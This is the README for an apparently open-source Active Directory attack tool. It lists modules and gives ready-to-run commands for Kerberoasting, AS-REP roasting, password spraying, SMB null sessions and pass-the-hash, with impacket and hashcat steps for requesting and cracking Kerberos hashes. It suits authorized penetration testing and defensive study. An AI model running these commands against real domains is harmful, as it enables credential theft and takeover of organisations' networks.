# Ghost-AD

> Active Directory framework - LDAP enumeration, Kerberoasting, AS-REP Roasting, and BloodHound-lite.

```
  GHOST-AD  v1.0.0  |  Active Directory Attack Framework
  By Gh0st-Bx1      |  github.com/Ghost-Bx1
```

![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)
![Category](https://img.shields.io/badge/Category-Active%20Directory-red?style=flat-square)

---

## Overview

Ghost-AD is a single-file Python 3 framework for Active Directory offensive operations. It covers the main attack paths from an initial foothold to privilege escalation, with graceful degradation when optional dependencies are absent.

**Attack coverage:**

| Module       | Technique                                             |
|--------------|-------------------------------------------------------|
| `ldap`       | LDAP enumeration - users, groups, SPNs, UAC flags     |
| `kerb`       | Kerberoasting - list SPN accounts for offline cracking|
| `asrep`      | AS-REP Roasting - accounts without Kerberos pre-auth  |
| `spray`      | Password spraying with lockout detection              |
| `smb`        | SMB enumeration - null session, shares, signing check |
| `bloodhound` | BloodHound-lite JSON collection for path analysis     |
| `pth`        | Pass-the-Hash / Pass-the-Ticket command hints         |

---

## Requirements

```
Python 3.8+
ldap3       (required for: ldap, kerb, asrep, bloodhound)
impacket    (required for: spray, smb - degrades to hints without it)
colorama    (optional, Windows color support)
```

```bash
pip install ldap3 impacket
```

Without `ldap3`: LDAP modules fall back to port probing only.  
Without `impacket`: spray and smb print equivalent crackmapexec / smbclient commands.

---

## Installation

```bash
git clone https://github.com/Ghost-Bx1/ghost-ad
cd ghost-ad
pip install ldap3 impacket
```

---

## Usage

### LDAP Enumeration

```bash
# Authenticated session
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'

# Anonymous bind (no credentials)
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local

# Save output to JSON
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd' --output ldap.json
```

### Kerberoasting

```bash
python ghost-ad.py kerb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

Follow-up with impacket to request TGS and crack offline:

```bash
impacket-GetUserSPNs corp.local/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes wordlist.txt
```

### AS-REP Roasting

```bash
# Anonymous LDAP query
python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local

# Cross-reference against a user list
python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local --users-file users.txt
```

Request AS-REP hashes via impacket:

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes wordlist.txt
```

### Password Spray

```bash
python ghost-ad.py spray --dc 192.168.1.10 --domain corp.local \
    --users-file users.txt -p 'Winter2025!' --lockout 3 --delay 1.5
```

Always verify the domain lockout threshold before spraying.

### SMB Enumeration

```bash
# Null session probe
python ghost-ad.py smb --dc 192.168.1.10

# Authenticated
python ghost-ad.py smb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

### BloodHound-lite

```bash
python ghost-ad.py bloodhound --dc 192.168.1.10 --domain corp.local \
    -u jdoe -p 'P@ssw0rd' --output bh_corp.json
```

Output JSON contains: users, groups, SPNs, AS-REP accounts, adminCount.  
Import into BloodHound CE for attack path analysis.

### Pass-the-Hash / Pass-the-Ticket

```bash
python ghost-ad.py pth --dc 192.168.1.10 --domain corp.local \
    -u Administrator --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Reference

### Global flags

| Flag              | Description                                      |
|-------------------|--------------------------------------------------|
| `-v / --verbose`  | Verbose output                                   |
| `--output <file>` | Save results to JSON                             |
| `--no-banner`     | Suppress the startup banner                      |
| `--proxy <url>`   | HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)   |

### Per-module flags

**ldap / kerb / smb / bloodhound**

| Flag              | Description                                      |
|-------------------|--------------------------------------------------|
| `--dc <ip>`       | Domain Controller IP or hostname (required)      |
| `--domain <dom>`  | AD domain, e.g. corp.local (required)            |
| `-u / --user`     | Authenticating user (optional)                   |
| `-p / --password` | User password                                    |

**asrep**

| Flag             | Description                                       |
|------------------|---------------------------------------------------|
| `--dc <ip>`      | Domain Controller IP                              |
| `--domain <dom>` | AD domain                                         |
| `--users-file`   | User list for cross-reference (optional)          |

**spray**

| Flag              | Description                                      |
|-------------------|--------------------------------------------------|
| `--dc <ip>`       | Domain Controller IP                             |
| `--domain <dom>`  | AD domain                                        |
| `--users-file`    | File with one username per line (required)       |
| `-p / --password` | Password to test against all users              |
| `--lockout <n>`   | Estimated lockout threshold (default: 3)         |
| `--delay <s>`     | Delay in seconds between attempts (default: 1.0) |

**pth**

| Flag          | Description                               |
|---------------|-------------------------------------------|
| `--dc <ip>`   | Domain Controller IP                      |
| `--domain`    | AD domain                                 |
| `-u / --user` | Target user (default: administrator)      |
| `--hash`      | NTLM hash - LM:NT or :NT format           |

---

## Ghost Toolkit

| Tool | Description |
|------|-------------|
| [ghost-ad](https://github.com/Ghost-Bx1/ghost-ad) | Active Directory - LDAP, Kerberoasting, AS-REP Roasting, BloodHound-lite |
| [ghost-cloud](https://github.com/Ghost-Bx1/ghost-cloud) | Cloud Security - AWS, Azure and GCP misconfiguration scanner |
| [ghost-fuzz](https://github.com/Ghost-Bx1/ghost-fuzz) | Web Fuzzing - directory brute-force, parameter fuzzing, vhost enumeration |
| [ghost-osint](https://github.com/Ghost-Bx1/ghost-osint) | OSINT - domain, email and IP intelligence from public sources |
| [ghost-privesc](https://github.com/Ghost-Bx1/ghost-privesc) | Privilege Escalation - Linux privesc checker, 17 vectors, GTFOBins |
| [ghost-recon](https://github.com/Ghost-Bx1/ghost-recon) | Reconnaissance - DNS, SSL, WAF, subdomain enumeration, email security |
| [ghost-report](https://github.com/Ghost-Bx1/ghost-report) | Reporting - pentest report generator from any ghost-* JSON output |
| [ghost-scan](https://github.com/Ghost-Bx1/ghost-scan) | Port Scanner - async TCP/UDP scanner with banner grabbing and CVE correlation |
| [ghost-shell](https://github.com/Ghost-Bx1/ghost-shell) | Payload Generation - reverse shell and web shell generator, 25+ languages |
| [ghost-spray](https://github.com/Ghost-Bx1/ghost-spray) | Credential Attacks - password spraying, stuffing, default credential testing |
| [ghost-wifi](https://github.com/Ghost-Bx1/ghost-wifi) | WiFi Attacks - monitor mode, deauth, WPA/WPA2 capture, PMKID, WPS, Evil Twin |

---

## Disclaimer

For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
